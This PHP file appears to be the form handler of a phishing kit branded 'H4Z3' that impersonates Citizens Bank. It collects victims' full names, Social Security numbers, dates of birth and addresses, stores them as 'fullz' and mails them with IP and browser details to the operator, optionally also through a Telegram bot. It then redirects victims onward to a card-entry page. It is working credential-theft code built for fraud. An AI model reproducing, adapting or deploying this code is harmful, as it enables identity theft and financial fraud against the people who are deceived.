<?php
include '../settings.php';
include 'functions.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $fName = $_POST['fname'];
    $addy = $_POST['address'];
    $dob = $_POST['dob'];
    $ssn = $_POST['ssn'];
    $mmn = $_POST['ssn'];
    $city = $_POST['city'];
    $state = $_POST['state'];
    $zip = $_POST['zip'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $ip = getenv("REMOTE_ADDR");

    h4z3_store_submission('fullz', $_POST);
    
  	        $body  = "++++++++++ 🐱‍💻 CITIZEN BANK PERSONAL INFO 🐱‍💻 ++++++++++\r\n";
            $body .= "Full Name     : $fName\r\n";
            $body .= "SSN           : $ssn\r\n";
            $body .= "MMN           : $mmn\r\n";
            $body .= "DOB           : $dob\r\n";
            $body .= "Address       : $addy\r\n";
            $body .= "City          : $city\r\n";
            $body .= "State         : $state\r\n";
            $body .= "Zip Code      : $zip\r\n";
            $body .= "|--------------- I N F O | I P -------------------|\r\n";
            $body .= "IP          : $ip\r\n";
            $body .= "User Agent  : $user_agent\r\n";
            $body .= "Country     : $cn\r\n";
            $body .= "Region      : $regioncity\r\n";
            $body .= "City        : $citykota\r\n";
            $body .= "OS / BR     : $os / $br\r\n";
            $body .= "Timezone    : $timezone\r\n";
            $body .= "Date        : $date\r\n";
            $body .= "+++++++++++++++ ‍H4Z3 +++++++++++++++\r\n";
    
      $subject  = "🐱‍💻 ‍H4Z3 CITIZEN BANK PERSONAL INFO => FROM $ip 🐱‍💻";
      $headers  = "From: 🐱‍💻 ‍H4Z3 🐱‍💻 <m4r1ju4n4r3sult@h4z3.com>\r\n";
      $headers .= "MIME-Version: 1.0\r\n";
      $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    if (function_exists('mail')) {
        $mailResult = @mail($to, $subject, $body, $headers);
        if (!$mailResult) {
            h4z3_mark_channel_failure('mail_failed');
        }
    } else {
        h4z3_mark_channel_failure('mail_unavailable');
    }

    if($tgresult == "on"){
        $telegramResult = h4z3_send_telegram($body, $boturl, $chatid);
        if (!$telegramResult) {
            h4z3_mark_channel_failure('telegram_failed');
        }
        }

        
        if($debitpage == "on"){
          header('Location: ../card.php');
          exit;
        }
        else{
          header('Location: ../complete.php');
          exit;
        }

}
?>